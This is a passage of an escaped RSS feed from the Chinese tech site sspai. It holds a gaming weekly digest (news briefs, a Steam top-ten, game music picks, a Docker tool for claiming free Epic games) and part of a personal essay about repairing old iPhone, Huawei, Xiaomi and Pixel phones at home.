同样拥有专门的 <a href=\"https://www.amazon.com/Certified-Refurbished/b?ie=UTF8&amp;node=12653393011\" target=\"_blank\">翻新产品板块</a>，覆盖范围相当全面，从电子产品到园艺工具，无所不包。这些产品均由供应商或亚马逊官方进行全面检测、维修、清洁，所有功能正常，外观无明显瑕疵，价格更实惠。如果购买的翻新产品出现质量问题，你还可以享受 90 天免费退换货服务，使用无忧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/4156cab2856390a64f263ae7f848e1fc.png\"></figure><h2>写在最后</h2>\n<p>除了文中介绍的教育优惠，其它品牌也可能推出了返校季活动，许多实体店还提供类似「出示录取通知书赠好礼」的学生福利。如果你有喜欢的品牌，不妨尝试去线下门店了解。</p>\n<p>与软件不同的是，硬件价格的波动与套路更多，一些品牌的海外售价可能低于国内的教育优惠，官网定价也可能高于市场行情，实际购买前还请货比三家再做决定。</p>\n<p>本文就暂且在此打住，如果你知道其它超划算或超实用的硬件学生优惠，欢迎在评论区补充分享。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，不再错过任何一款好用的 App 💡</p>\n<p>&gt; 更多福利、指南、利器和生活小妙招，尽在少数派 <a href=\"https://sspai.com/topic/163\" target=\"_blank\">开学季</a> 专题 ⭐</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68461"},{"title":"瞎玩菌的游戏周报：「游戏歪曲历史」后续、《失控玩家》上映等","date":"2021-08-27 06:22:02","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.8.27 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>享乐</h2>\n<p>「享乐（yuè ）」版块是为了推荐好的游戏音乐，「享」字体现「分享」音乐和「享受」音乐两重意思。我衷心希望也许有人因为音乐从而对游戏产生兴趣（我就是）。也欢迎读者评论推荐你们喜欢的游戏音乐，我将会在后续的游戏周报中分享。</p>\n<h3>《Lewis' Coronation - Daydream》 - Jeff Russo</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqq5b34t9abj2c80g.jpeg\"></figure><p>你可以在 <a href=\"https://open.spotify.com/album/0dI3DcRX27ovAqUgSkyxlJ\" target=\"_blank\">Spotify</a> | <a href=\"https://music.youtube.com/playlist?list=OLAK5uy_npISFhzlnMLlM5gJdSM6KPDXLvQtXGl4g\" target=\"_blank\">YouTube Music</a> | <a href=\"https://music.apple.com/cn/album/what-remains-of-edith-finch-original-soundtrack/1340518871\" target=\"_blank\">Apple Music</a> | <a href=\"https://y.qq.com/n/ryqq/albumDetail/001Cudlk08ps7T\" target=\"_blank\">QQ 音乐</a>（曲目不全） | <a href=\"https://music.163.com/#/album?id=36225231\" target=\"_blank\">网易云音乐</a> 收听这张原声音乐专辑，或者按名称在你喜欢的音乐服务中搜索。</p>\n<p>我最推荐的是从第 12 首到第 16 首（下图）的这一段组曲，对应游戏中家族成员 Lewis 的离奇故事，同时也是整个游戏中最大的亮点。这款游戏已经于近日上架了 iOS App Store（暂无国区）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqqdb34t9a5fkksk0.png\"></figure> <h2>要闻</h2>\n<p>「要闻」版块为你带来游戏领域最重要的话题性事件，除了展示足够丰富的细节，还有我主观的点评、吐槽或提问。游戏本身就是一种互动娱乐，我非常鼓励读者通过评论互动的方式，参与到话题中来，而不是仅仅当个「读」者。</p>\n<p><strong>本期空缺</strong></p>\n<p>由于过去一周没有发生什么重要的话题性事件，或者说没有什么让我想深入聊的新闻，本着<strong>宁缺毋滥</strong>的原则，本期的要闻空缺。</p>\n<h2>简讯</h2>\n<p>「简讯」版块是为了控制游戏周报的篇幅，并保持足够的信息量。大部分时候瞎玩菌尽量用一句话浓缩信息，也可能不止一句话。感兴趣的读者可以点击每条新闻末尾的链接符号 🔗 以了解更多信息。</p>\n<h3>《江南百景图》为「游戏歪曲历史」道歉，相关负责人停职</h3>\n<p>瞎玩菌在上周的游戏周报里提到，央广网发文，不点名批评了手游《江南百景图》「歪曲历史」。作为此事的后续，该游戏官方发布道歉声明，因为策划团队的史学功底不足，且制作和审核过程中严重失责，导致这次以民族英雄「岳飞」为原型的形象设计存在严重错误。游戏开发团队追悔莫及，深表歉意。相关责任人被处以停职处分并将对有争议的内容进行整改。 <a href=\"https://weibo.com/7330882369/KukUe1HW3\" target=\"_blank\">🔗</a></p>\n<h3>游戏 NPC 担任主角的电影《失控玩家》今天起在国内上映</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqqlb34t9a5fkkskg.jpeg\"></figure><p>上上周的游戏周报最后一个彩蛋，就是这部电影的 8 张游戏化海报，《失控玩家》的主角是开放世界电子游戏的一名 NPC。这部电影飞速过审，并于 8 月 27 日起在中国大陆上映，官方公布了中国大陆的正式海报（上图）。 <a href=\"https://movie.douban.com/subject/30337388/\" target=\"_blank\">🔗</a></p> <h3>《英雄联盟》全球总决赛举办地由中国改为欧洲</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqr5b34t9a5fkksl0.png\"></figure><p>拳头游戏宣布，由于德尔塔变异株对全球旅行的限制和相关政策带来的影响，2021 《英雄联盟》全球总决赛（S11）举办地由中国改为欧洲，具体城市暂未确定。S11 原定在上海、青岛、武汉、成都和深圳五个城市举行，其中冠亚军决赛原定在深圳龙岗大运中心举行。 <a href=\"https://www.upcomer.com/sources-worlds-2021-moving-from-china-to-europe/\" target=\"_blank\">🔗</a></p>\n<h3>2021 年科隆游戏展大奖提名</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqr5b34t9abj2c810.jpeg\"></figure><p>2021 年科隆游戏展大奖公布了提名名单，一共有 22 个奖项，其中尚未发售的《艾尔登法环》（Elden Ring）出现在多个奖项的提名中。具体提名名单参见链接。 <a href=\"https://www.gamescom.global/the-gamescom/gamescom-award/#nominees\" target=\"_blank\">🔗</a></p>\n<h3>Tim Cook 曾想增加 Mac 平台的 3A 游戏</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqrdb34t99b7ntfig.gif\"></figure><p>从 Epic 与苹果的邮件中爆出，Tim Cook 认为 Mac 平台缺少 3A 游戏，而 Phil Schiller 则说已经尝试过在 Mac App Store 引进《命令与征服》《使命召唤》《古墓丽影》《生化奇兵》《刺客信条》这样的 3A 游戏，但并不成功。 <a href=\"https://embed.documentcloud.org/documents/21043929-2015-december-tim-cook-wants-mac-app-store-gaming/#document/p1\" target=\"_blank\">🔗</a></p>\n<h3>Epic 游戏商城自助发行工具 Beta 封测</h3>\n<p>游戏开发者可以通过 <a href=\"http://www.epicgames.com/store/publish\" target=\"_blank\">开放的注册入口</a>，来参与一系列全新 Epic 游戏商城自助发布工具的 Beta 封测。这些全新的工具可让开发者们自由配置他们在Epic游戏商城的产品页面、成就、定价、优惠，并上传构筑和更新内容。 <a href=\"https://www.epicgames.com/store/zh-CN/news/epic-games-store-self-publishing-closed-beta-opens-today\" target=\"_blank\">🔗</a></p>\n<h3>PlayStation 工作室负责人希望第一方多做点「非常大胆」的游戏</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqrtb34t9a5fkkslg.jpeg\"></figure><p>PlayStation 工作室负责人 Hermen Hulst 表示，他希望第一方开发者继续在他们的游戏中做出「非常大胆」（Fiercely Daring）的选择，如《战神》的新方向和《最后生还者 第二篇章》的叙事结构，以及创造一种令人难以置信的体验，但不一定在任何时候都让玩家感到舒服。他说：「我希望我们能推陈出新，拓展我们的媒介和讲故事的艺术水平的边界」。 <a href=\"https://www.gameinformer.com/2021/08/20/inside-the-mind-of-playstation-studios-hermen-hulst\" target=\"_blank\">🔗</a></p>\n<h3>PS5 的小幅度改进机型</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqrtb34t99b7ntfj0.jpeg\"></figure><p>索尼悄悄地在澳大利亚上架销售 PS5 的小幅度改进机型，型号是 CFI-1102A。这款机型比原来的机型轻了 300 克左右，并且底座更换了一颗螺丝，新的螺丝可以徒手拧而不再需要螺丝刀。 <a href=\"https://press-start.com.au/news/playstation/2021/08/25/new-ps5-model-cfi-1102a-australia/\" target=\"_blank\">🔗</a></p>\n<h3>Steam 销量榜</h3>\n<p>Steam 上周销量榜前 10 名如下：</p>\n<ol>\n<li>《人类》</li>\n<li>《永劫无间》</li>\n<li>《人类》数字豪华版</li>\n<li>V 社 VR 套件</li>\n<li>《毁灭战士永恒》豪华版</li>\n<li>《上古卷轴 OL》Crown Packs</li>\n<li>《汽车机械师模拟器 2021》</li>\n<li>《12 分钟》</li>\n<li>《辐射 4 年度版》</li>\n<li>《永劫无间》其他版本 <a href=\"https://steamdb.info/topsellers/2021W33/\" target=\"_blank\">🔗</a>\n</li>\n</ol>\n<h3>PlayStation Plus 会员服务半价优惠</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqs5b34t9a5fkksm0.jpeg\"></figure><p>PlayStation Plus 会员服务推出了针对<strong>非会员</strong>的半价优惠，一年会费原价 308 港元，现价为 154 港元（史低）。这项优惠持续到 8 月 31 日上午 9 点截止。 <a href=\"https://store.playstation.com/zh-hans-hk/product/IP9103-NPIA90007_01-PSPLUS12MO50OF00/\" target=\"_blank\">🔗</a></p>\n<h3>PlayStation 商店优惠</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqsdb34t9arh0b3ig.png\"></figure><p>PlayStation 商店（港服）推出多个游戏优惠活动，包括「148 港元以下折扣」、「Playstation Indies」 、「本周精选优惠」等，多款游戏好价可入。 <a href=\"https://store.playstation.com/zh-hans-hk/deals/\" target=\"_blank\">🔗</a></p>\n<h3>Gamasutra 改名为 Game Developer</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqslb34t9a5fkksmg.png\"></figure><p>老牌的游戏开发者常用网站 Gamasutra 改名为 Game Developer，域名也会变成 www.gamedeveloper.com。瞎玩菌在此认真推荐，如果你对游戏设计和开发感兴趣，一定不要错过这个网站上的内容。 <a href=\"https://gamasutra.com/view/news/387227/Gamasutra_is_becoming_Game_Developer.php\" target=\"_blank\">🔗</a></p>\n<h3>《战地 2042》外挂</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqstb34t99b7ntfjg.jpeg\"></figure><p>虽然《战地 2042》（Battlefield 2042）还未发售，一个叫 iwantcheats 的网站已经开始售卖其外挂，这款外挂宣称自己拥有自瞄等功能，甚至可以反检测。 <a href=\"https://charlieintel.com/a-cheat-provider-is-unfortunately-already-offering-hacks-for-battlefield-2042/117584/\" target=\"_blank\">🔗</a></p>\n<h3>足球游戏流行起女性要素</h3>\n<p>分享一篇《足球周刊》的文章《<a href=\"https://mp.weixin.qq.com/s/piPYxqp1J76QM0GgtfMAiQ\" target=\"_blank\">游戏丨她力量！2022足游开打女性牌？</a>》。 <a href=\"https://mp.weixin.qq.com/s/piPYxqp1J76QM0GgtfMAiQ\" target=\"_blank\">🔗</a></p>\n<h3>最佳 PC 策略游戏</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqt5b34t99b7ntfk0.jpeg\"></figure><p>Kotaku 更新了他们评选的 11 款 最佳 PC 策略游戏，分别是（排名不分先后）：</p>\n<ul>\n<li>《文明 6》（Civilization VI）</li>\n<li>《十字军之王 3》（Crusader Kings III）</li>\n<li>《无尽传奇》（Endless Legend）</li>\n<li>《英雄连》（Company of Heroes）</li>\n<li>《全面战争：幕府将军 2》（Total War: Shogun 2）</li>\n<li>《家园》（Homeworld）</li>\n<li>《装甲军团》（Panzer Corps）</li>\n<li>《冲突世界》（World in Conflict）</li>\n<li>《幽浮 2》（XCOM 2）</li>\n<li>《帝国时代 2：国王时代》（Age of Empires II: Age of Kings）</li>\n<li>《钢铁雄心 4》（Hearts of Iron IV）</li>\n</ul>\n<p>还有一些没有进入榜单的优秀策略游戏，请通过末尾链接查看原文最后一段。 <a href=\"https://kotaku.com/the-best-strategy-games-on-pc-1766534236\" target=\"_blank\">🔗</a></p>\n<h3>Humble Games 与 Xbox Game Pass 合作</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqtdb34t9a5fkksn0.png\"></figure><p>Humble Games 的 10 款独立游戏将首发登录 Xbox Game Pass，分别是《Archvale》《Bushiden》《Chinatown Detective Agency》《Dodgeball Academia》《Flynn: Son of Crimson》《Midnight Fight Express》《Next Space Rebels》《Signalis》《Unpacking》《Unsighted》。 <a href=\"https://www.youtube.com/watch?v=S90uou_Jrqo\" target=\"_blank\">🔗</a></p>\n<h3>《黑神话：悟空》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqtlb34t9arh0b3j0.png\"></figure><p>《黑神话：悟空》上周发布的 12 分钟实机测试集锦视频，在 YouTube 平台上，通过海外独家发布的 IGN 频道已经播放超过 500 万次，已有 19 万次点赞。在视频下方评论区的海外观众反应可以用下面的表情包概括。 <a href=\"https://www.youtube.com/watch?v=nOMIwsupy9k\" target=\"_blank\">🔗</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqudb34t9arh0b3jg.jpeg\"></figure><h3>《老滚 5》十周年纪念版</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqulb34t9arh0b3k0.jpeg\"></figure><p>B 社将于 11 月 11 日发售《上古卷轴 5》十周年纪念版，该版本包含 500 多个 Creation Club 的内容，例如任务、敌人、武器、法术等。别骂了别骂了，《老滚 6》的文件夹已经建好了。 <a href=\"https://elderscrolls.bethesda.net/en/skyrim10\" target=\"_blank\">🔗</a></p>\n<h3>《使命召唤：先锋》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqutb34t9abj2c81g.jpeg\"></figure><p>回到二战战场的《使命召唤：先锋》（Call of Duty: Vanguard）将于 11 月 5 日上线，包含包含战役、多人模式和僵尸模式，支持跨平台联机和跨平台进度共享。 <a href=\"https://www.youtube.com/watch?v=OQ1CwPhE8KQ\" target=\"_blank\">🔗</a></p> <h3>《分享同乐！瓦力欧制造》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqv5b34t9a5fkksng.png\"></figure><p>《分享同乐！瓦力欧制造》的免费试玩版已经登录 eShop，9 月 10 日正式发售。这款游戏包含 200 多个小游戏，并且支持 2 人同屏游玩和 4 人对战。 <a href=\"https://www.nintendo.com/games/detail/warioware-get-it-together-switch/\" target=\"_blank\">🔗</a></p>\n<h3>《奇异人生：本色》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfqvlb34t9a5fkkso0.png\"></figure><p>《奇异人生：本色》（Life Is Strange: True Colors）公布了首个实机演示视频。 <a href=\"https://www.youtube.com/watch?v=sCx-j4hrwpA\" target=\"_blank\">🔗</a></p> <h3>《刺客信条 奥德赛》</h3>\n<p>《刺客信条 奥德赛》的 1.6.0 版本免费更新支持了在 Xbox Series X | S 和 PS5 上以 60 帧游玩。 <a href=\"https://discussions.ubisoft.com/topic/104296/title-update-1-6-0-60fps-boost-on-xbox-series-x-s-ps5-aug-24?lang=en-US\" target=\"_blank\">🔗</a></p>\n<h3>《雷神之锤》重制版</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfr0db34t99b7ntfkg.png\"></figure><p>《雷神之锤》（Quake）重制版现已在各大主机和 PC 平台上架，售价 9.99 美元。 <a href=\"https://www.youtube.com/watch?v=tw23-NCc1vU\" target=\"_blank\">🔗</a></p> <h3>《十字军之王 3》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfr0tb34t9abj2c820.png\"></figure><p>《十字军之王 3》（Crusader Kings III）将登录 Xbox Series X 和 PS5 平台。 <a href=\"https://www.polygon.com/22638378/crusader-kings-3-ps5-xbox-console-royal-court-release-date-dlc\" target=\"_blank\">🔗</a></p>\n<p><a href=\"https://www.youtube.com/watch?v=Lny769zeW3Q\" target=\"_blank\">YouTube 视频</a></p>\n<h3>《绝地求生：未来之役》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfr1db34t9a5fkksog.jpeg\"></figure><p>《绝地求生：未来之役》（PUBG: New State）现已开放 iOS App Store 的预注册。 <a href=\"https://apps.apple.com/app/id1542727626?mt=8\" target=\"_blank\">🔗</a></p>\n<h3>《山谷物语》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfr1lb34t99b7ntfl0.png\"></figure><p>Supercell 的新游戏《山谷物语》（Everdale）主打合作建造玩法，玩家现已可在 iOS App Store 和 Google Play Store 下载。 <a href=\"https://everdale.com/\" target=\"_blank\">🔗</a></p> <h3>《零 濡鸦之巫女 高清版》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfr25b34t9arh0b3kg.jpeg\"></figure><p>《零 濡鸦之巫女 高清版》新增了一批服装，是不是很眼熟？ <a href=\"https://www.famitsu.com/news/202108/18230649.html\" target=\"_blank\">🔗</a></p>\n<h2>彩蛋</h2>\n<p>「彩蛋」版块旨在分享有趣或有料的游戏相关内容，但不是严肃的游戏新闻。内容来源不限于玩家社群，MOD，二创，同人或 ACG 衍生的亚文化等。</p>\n<h3>🌈🥚1 在 Xbox 上玩 PS 游戏，而且支持 4K 分辨率</h3>\n<p>通过 <a href=\"https://github.com/stenzek/duckstation\" target=\"_blank\">DuckStation</a> 模拟器，你可以在 Xbox Series X | S 上以 4K 分辨率玩 PS1 游戏。</p>\n<p>DuckStation 是一个新的 PlayStation 1 模拟器，专注于速度、准确性和可维护性——基于 UWP 构建和 Direct X 12 支持，它可以在 Xbox Series X | S 上运行。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfr2db34t9a5fkksp0.png\"></figure><p>你可以在 <a href=\"https://www.youtube.com/watch?v=DU5Cs1tz66Q\" target=\"_blank\">YouTube</a> | <a href=\"https://www.bilibili.com/video/BV1if4y1G7kH/\" target=\"_blank\">哔哩哔哩</a> 观看实机演示视频。在视频里，我们可以看到 DuckStation 在 Xbox Series S 的开发者模式下运行，并解释为什么它是迄今为止最令人印象深刻的 PlayStation 1 模拟器。</p> <h3>🌈🥚2 当你把一个《辐射》MOD 做得太好时，B 社直接在你做出来之前就把你招走</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfr2tb34t99b7ntflg.png\"></figure><p>MOD 《<a href=\"https://fallout4london.com/\" target=\"_blank\">辐射：伦敦</a>》的创作者 Stephanie Zachariadis 就这样被 <a href=\"https://twitter.com/FalloutLondon/status/1428900616135487492\" target=\"_blank\">Bethesda</a> 招聘进来了。</p>\n<p>你可以在 <a href=\"https://www.youtube.com/watch?v=bS-EQG0C1sM\" target=\"_blank\">YouTube</a> | <a href=\"https://www.bilibili.com/video/BV1YU4y157kd\" target=\"_blank\">哔哩哔哩</a> 一睹这款 MOD 的风采。</p> <h3>🌈🥚3 在《对马岛之鬼》里撸猫是 The Verge 编辑最喜欢的 PS5 特性</h3>\n<p><a href=\"https://www.theverge.com/22631060/ghost-of-tsushima-directors-cut-ps5-cats-dualsense-controller\" target=\"_blank\">Andrew Webster</a> 是这么认为的，因为 PS5 的手柄震动极好地还原了与猫咪互动的体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jfr3db34t99b7ntfm0.jpeg\"></figure><p>《对马岛之鬼 导演剪辑版》加入了一堆新内容，包括小猫咪。</p>\n<p>并且他还认为使得《对马岛之鬼》如此与众不同的部分原因是它平衡了残酷、血腥的战斗和更安静、更反思的时刻。</p>\n<h3>🌈🥚4 自动领取 Epic 游戏商城的每周限免游戏</h3>\n<p>使用 <a href=\"https://hub.docker.com/r/luminoleon/epicgames-claimer\" target=\"_blank\">EpicGames Claimer</a> 这个 Docker 镜像，然后只需要一行命令启动：</p>\n<p><code>docker run -it luminoleon/epicgames-claimer</code></p>\n<p>来源于 <a href=\"https://github.com/luminoleon/epicgames-claimer/blob/master/docs/README_ZH.md\" target=\"_blank\">此项目</a>，请自行检视代码内容。</p>\n<p>📧 纠错/反馈/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68478"},{"title":"手机坏了不求人，自己修手机也可以轻松又有趣","date":"2021-08-27 03:30:42","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote><p>自己修。</p></blockquote>\n<p>初听上去，这句话仿佛是一团包含着电烙铁、焊锡、松香和伤痕累累的焊台的混乱场景——事实并非如此。在某种程度上，手机其实已经实现了「模块化」，并非在使用与功能方面，而是在内部结构与零件替换上。与此同时，以往专业性很强的各式工具现在大多都可以轻松地在网上买到，「自己修手机」已经不再是一个能或不能的问题，而是一个是否愿意投入时间精力的问题。下到给手机换一块新的电池，上至彻底更换外壳，这种与拼乐高类似的快感，应该是所有人都可以享受到的。</p>\n<h2>🤔旧手机与不是自己的手机</h2>\n<h3>一台 iPhone</h3>\n<p>我记不太清是从什么时候开始关注的油管主 Hugh Jeffreys，一个坐标澳大利亚、仿佛什么电子产品都能自己动手修的男人。在几乎把他的手机维修类视频翻了个遍之后，我也似乎有了动力，摩拳擦掌地准备在我现有的几台设备上试试手了。</p>\n<p>我人生中的第二部手机是 2013 年作为礼物收到的、一台 32G 的黑色 iPhone 5。它奇迹般地在两年多的工作时间内完全没有遇到当年影响颇广的「掉漆门」问题，跟着我上了黄山、去了德国，在它上面我第一次用上了 Facebook 和 WhatsApp，体验了从 iOS 6 到 iOS 7 的剧变，并且通过它结识了一名保持邮件来往至今的俄罗斯姑娘。</p>\n<p>然而在 2014 到 2015 年中间的某个时刻，这台 iPhone 5 经历过一场惨烈且「有些难以启齿」的事故，以至于只有主板留存了下来。由于它特殊的纪念性，我一直很想再给这块主板找一个新的身体——毕竟上面还有一些照片，能够把里面的数据留存下来是很有意义的。</p>\n<p>整个计划却被我一拖再拖，以至于到了 2020 年才真正着手实施。更换的过程实际上非常简单——从闲鱼上花 190 块钱买了一台 16G 的双网 iPhone 5、把手机拆开、把 16G 的主板卸下来、把我的 32G 主板装进去，完工。由于不涉及到拆换电池或者更换其他的零件，完整的「换芯」流程并没有超过二十分钟。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/827e8abc9e2d11cd851a64073ed90c55.JPG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/d1eab3939b8fea0b99b618a991cc5ee9.JPG\" alt=\"\"></figure><p>整个「偷梁换柱」的过程也的确如预期般顺利，唯一的缺憾在于当时并没有一个可用的吸盘，用美工刀把屏幕撬开的时候在塑料屏幕支架上和 iPhone 5 独有的高光边框倒角上留下了不少划痕。但结果仍然是皆大欢喜的——我不仅救活了我的第二部手机，并且多了一个能打电话、收发短信的 MP3 播放器。</p>\n<h3>一台华为</h3>\n<p>有了前面折腾iPhone 5的经历，当 @Xenogeneic 告诉我他的华为 Nova 5 Pro 因为摔在地上而屏幕破裂氧化的时候，我当即回答：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/c7704975ce347afa72caec121173eae9.jpg\"></figure><p>转念一想，正好工具都在手边，急忙改口：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/ef765773975896dd0eb6b2ee21144c58.jpg\"></figure><p>氧化与烧屏一样，是对于 OLED 屏幕不可逆的损伤，更糟糕的氧化区域会随着时间而逐渐扩散到整块屏幕，唯一能做的就是赶在屏幕彻底无法显示之前备份好数据、然后更换整块显示屏。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/877033f92b7a182a0206371447ffa91f.JPG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/0f9d418a62e0b2b4513bc1e424807350.JPG\" alt=\"\"></figure><p>虽然时值期末附近，我们仍然讨论了许久究竟是趁这个机会买一台新的手机还是继续在这台 Nova 上面缝缝补补。由于 Xeno 计划着趁暑假去一次贡嘎雪山，旅程前后期的开销都比较大，最终还是决定先修好这台现有的机器再说。</p>\n<p>得益于 2014 年以来手机制造工艺的进步，华为换屏幕的步骤甚至比 iPhone 5 换主板的步骤还要多些。更麻烦的是我们第一次尝试着撬开屏幕的时候错把撬片插进了屏幕支架与玻璃之间，险些把玻璃撬碎——幸好原本的屏幕已经有五分之四的面积彻底氧化了，并不需要担心弄得更坏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/c14e80c9851ac83d990b82cf019ebaaa.jpg\"><figcaption>同为 Matrix 作者的厚米 @Xenogeneic</figcaption></figure><p>把新的国产屏装上之后，我们俩反复对比着红色过饱和、蓝色过饱和、白平衡偏绿的 Nova 5 Pro 和我借给他的 Xperia 1，达成了一致的结论：还不如再买一台 Pixel 3🌚。</p>\n<h3>一台小米</h3>\n<p>就在和 Xeno 一起换好了屏幕的一个月之后，他又机缘巧合的从一个大四毕业、早早离校的学长的宿舍里面翻到了一台成色相当完美的小米6。美中不足的是经过多番联络，那名学长是因为忘记了锁屏密码才决定把手机 <s>扔掉</s> 留给有缘人的。当我们尝试通过正常的手段抹掉数据重置的时候，很不幸地得知他连小米账号的密码都不记得了，并且绑定账号的那张手机卡亦已不再使用，以至于无法找回密码。 </p>\n<p>因此只能寻求第三方的维修服务了。无论从淘宝还是论坛上咨询到的方法都需要拆机并短接主板上的两个触点，然后大概是通过 9008 模式「趁自带的 rec 不注意」刷进一套新系统（比如  SkyMi）——但是无论如何，想要让这台小米 6 恢复使用都是需要拆机的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/2c84b78e758d861dcad59a79684f785b.png\"><figcaption>来源：bilibili 老孙IT</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/9bd00cda88869dff821ab1b54ec11b99.jpg\"></figure><p>于是我们便赶在期末考试前又拆了一台手机，顺便把背板换成了白色。这台焕发新生的小米 6 目前正被 Xeno 用作备用机，虽然无法再升级系统，但是作为听歌刷推看 ins 用的机器和兼职摄影时的副机位已经完全足够了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/16/c9f55e0515a6573595dabb2003339ffa.jpg\"><figcaption>用小米 6 拍摄的胶片机取景器</figcaption></figure><h2>🔋2021 年的 Pixel 3</h2>\n<p>在和 Xeno 达成一致不应该费劲换一块质量更次的屏幕而是应该直接买一部 Pixel 的时候，我自己的 Pixel 3 每日续航仍然尚可，稍微注意一点的话可以完整地撑过一整天的上课时光。然而经历了「半高强度」使用了两个半月之后，它的电池终于还是寿终正寝了。在小黄鱼上交流的时候，卖家的确提及过它的电池衰减比较严重，但是我仍然没有想到，在我主要以无线充电的方式使用下来，它的电池会直接膨胀。以至于换电池之前的那几天，我甚至开发出了拿着 80% 就关机的 Pixel 3 在桌子上当陀螺玩的新技能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/a15355e7d928cec8218b940a0ad809b6.jpg\"><figcaption>从这个角度可以比较清楚地看到后盖被电池顶起来的缝隙</figcaption></figure><p>由于这台 Pixel 是我一直心心念念的机器，它上面的各种小问题都会因为理想与现实的差距而被放大。尽管我在前序文章里面提到过，如果稍加规划，它的电池续航是可以完整地撑过在学校的一天的，但是在使用过程中仍然有不小的心理负担。再加上我的入手理由中有很大一部分是为了 Pixel 